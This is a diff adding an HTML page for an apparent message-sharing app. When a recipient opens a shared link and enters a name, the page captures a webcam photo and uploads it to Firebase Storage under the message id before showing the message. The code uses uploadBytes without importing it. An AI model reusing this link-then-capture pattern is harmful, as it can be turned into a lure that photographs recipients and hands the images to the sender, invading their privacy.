@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Receiver - Message Sharing Application</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: url('download.jpeg') no-repeat center center fixed;
+            background-size: cover;
+            font-family: Arial, sans-serif;
+            color: #fff;
+            text-align: center;
+        }
+        .container {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 40px 20px;
+            border-radius: 10px;
+            width: 300px;
+        }
+        input[type="text"] {
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 16px;
+            width: 100%;
+        }
+        button {
+            background: #FF5722;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            height: 50px;
+            font-size: 20px;
+            cursor: pointer;
+            outline: none;
+            transition: transform 0.3s ease;
+        }
+        button:hover {
+            transform: scale(1.05);
+        }
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .popup-content {
+            background-color: rgba(0, 0, 0, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
+            color: #fff;
+            text-align: left;
+        }
+        footer {
+            position: fixed;
+            bottom: 10px;
+            width: 100%;
+            text-align: center;
+            font-size: 14px;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            opacity: 0.9;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container" id="receiverContainer">
+    <h1>Receiver</h1>
+    <input type="text" id="receiverName" placeholder="Your Name" required>
+    <button id="submitCaptureBtn">Capture Image</button>
+</div>
+
+<div class="popup" id="popup">
+    <div class="popup-content">
+        <h2>Dear <span id="receiverWishName"></span>,</h2>
+        <p id="displayedMessage"></p>
+        <img id="receiverImage" src="" alt="Receiver Image" style="width:100px; border-radius: 50%;">
+        <p>Sincerely,<br><span id="senderNameDisplay"></span></p>
+    </div>
+</div>
+
+<footer>
+    Design & Built By Your Name
+</footer>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-app.js";
+    import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-firestore.js";
+    import { getStorage, ref, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-storage.js";
+
+// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+const firebaseConfig = {
+  apiKey: "AIzaSyAwB8JWKIRK6Bkat-NdM6OyVAvdrBk5cmM",
+  authDomain: "capturedeep-126bf.firebaseapp.com",
+  projectId: "capturedeep-126bf",
+  storageBucket: "capturedeep-126bf.appspot.com",
+  messagingSenderId: "527347157327",
+  appId: "1:527347157327:web:d7db7bb6d0fe021547dd3a",
+  measurementId: "G-VZEFR8X5BN"
+};
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+    const storage = getStorage(app);
+
+    document.getElementById('submitCaptureBtn').addEventListener('click', async () => {
+        const receiverName = document.getElementById('receiverName').value.trim();
+        if (!receiverName) {
+            alert('Please enter your name.');
+            return;
+        }
+
+        const messageId = new URLSearchParams(window.location.search).get('id');
+        if (!messageId) {
+            alert('Invalid message link.');
+            return;
+        }
+
+        // Access the message from Firestore
+        const docRef = doc(db, 'messages', messageId);
+        const docSnap = await getDoc(docRef);
+
+        if (docSnap.exists()) {
+            const { senderMessage, senderName } = docSnap.data();
+
+            // Capture image logic (using webcam)
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                setTimeout(async () => {
+                    canvas.width = 640; // Set canvas width
+                    canvas.height = 480; // Set canvas height
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+
+                    // Stop the camera
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // Upload image to Firebase Storage
+                    const imageRef = ref(storage, `images/${messageId}.jpg`);
+                    await uploadBytes(imageRef, imageBlob);
+                    const imageURL = await getDownloadURL(imageRef);
+
+                    // Display in popup
+                    document.getElementById('receiverWishName').textContent = receiverName;
+                    document.getElementById('displayedMessage').textContent = senderMessage;
+                    document.getElementById('senderNameDisplay').textContent = senderName;
+                    document.getElementById('receiverImage').src = imageURL;
+
+                    // Show the popup
+                    document.getElementById('popup').style.display = 'flex';
+                }, 2000);
+            });
+        } else {
+            alert('No such message!');
+        }
+    });
+</script>
+
+</body>
+</html>
